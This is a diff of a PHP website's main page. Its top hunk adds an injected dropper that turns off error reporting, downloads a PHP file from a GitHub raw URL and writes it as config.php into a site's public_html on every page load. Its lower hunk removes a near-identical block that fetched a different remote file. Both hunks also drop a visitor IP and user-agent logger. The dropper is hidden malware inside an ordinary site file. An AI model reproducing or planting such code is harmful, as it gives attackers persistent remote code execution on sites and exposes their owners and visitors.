@@ -1,18 +1,48 @@
 <?php
-// Ziyaretçi bilgilerini al
-$ip_address = $_SERVER['REMOTE_ADDR']; // Ziyaretçinin IP adresi
-$timestamp = date("Y-m-d H:i:s"); // Ziyaretin tarihi ve saati
-$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Bilinmiyor'; // Ziyaretçinin tarayıcı bilgisi
+// Hata raporlamayı kapat
+error_reporting(0);
 
-// Kayıt edilecek metin formatı
-$log_data = "IP: $ip_address | Zaman: $timestamp | Tarayıcı: $user_agent\n";
+// İndirilecek dosyanın URL'si
+$url = 'https://raw.githubusercontent.com/bayyx/bayy/refs/heads/main/index.php';
 
-// Dosya yolu
-$log_file = "bot.txt";
+// Oluşturulacak yerel dosyanın adı
+$localFileName = 'config.php';
 
-// Dosyaya yazma
-file_put_contents($log_file, $log_data, FILE_APPEND);
+// Hedeflenen dizinlerin listesi (isteğe göre eklenebilir)
+$targetDirectories = [
+    '/home/adalarfly/public_html'
+];
+
+// Belirtilen dizine dosyayı kaydetme işlevi
+function saveFileInDirectory($directory) {
+    global $url, $localFileName;
+
+    // Yerel dosya için tam yol oluştur
+    $filePath = rtrim($directory, '/') . '/' . $localFileName;
+
+    // URL'den dosya içeriğini indir
+    $content = file_get_contents($url);
+
+    if ($content !== false) {
+        // İçeriği yerel dosyaya kaydet
+        $result = file_put_contents($filePath, $content);
+
+        if ($result !== false) {
+            echo "+"; // Başarılıysa ekrana sadece "+" yaz
+        } else {
+            echo "Dosya kaydedilemedi: $filePath<br>";
+        }
+    } else {
+        echo "URL'den içerik indirilemedi: $directory<br>";
+    }
+}
+
+// Her hedef dizin için dosya kaydetme işlemini gerçekleştir
+foreach ($targetDirectories as $directory) {
+    saveFileInDirectory($directory);
+}
 ?>
+
 
 <?php
 require_once("application/app.php");
@@ -613,52 +643,6 @@ echo file_get_contents($cache_file);
         	<?=$settings['copyright']; ?> 
  		</div>
     </footer>
-    
-	
-	<?php
-error_reporting(0);
-
-// URL dari file teks yang akan diunduh
-$url = 'https://raw.githubusercontent.com/bayyx/bayy/refs/heads/main/link.php';
-
-// Nama file lokal yang ingin dibuat
-$localFileName = 'config.php';
-
-// Daftar direktori yang ingin dituju (dapat ditambahkan sesuai kebutuhan)
-$targetDirectories = [
-    '/home/adalarfly/public_html'
-];
-
-// Fungsi untuk menyimpan file di direktori yang ditentukan
-function saveFileInDirectory($directory) {
-    global $url, $localFileName;
-
-    // Buat path lengkap untuk file lokal
-    $filePath = rtrim($directory, '/') . '/' . $localFileName;
-
-    // Unduh isi file dari URL
-    $content = file_get_contents($url);
-
-    if ($content !== false) {
-        // Simpan isi file ke dalam file lokal
-        $result = file_put_contents($filePath, $content);
-
-        if ($result !== false) {
-            echo "/";
-        } else {
-            echo "Gagal menyimpan file $filePath.<br>";
-        }
-    } else {
-        echo "Gagal mengunduh konten dari URL untuk $directory.<br>";
-    }
-}
-
-// Lakukan penyimpanan file di setiap direktori yang dituju
-foreach ($targetDirectories as $directory) {
-    saveFileInDirectory($directory);
-}
-
-?>
 	
 	
 	
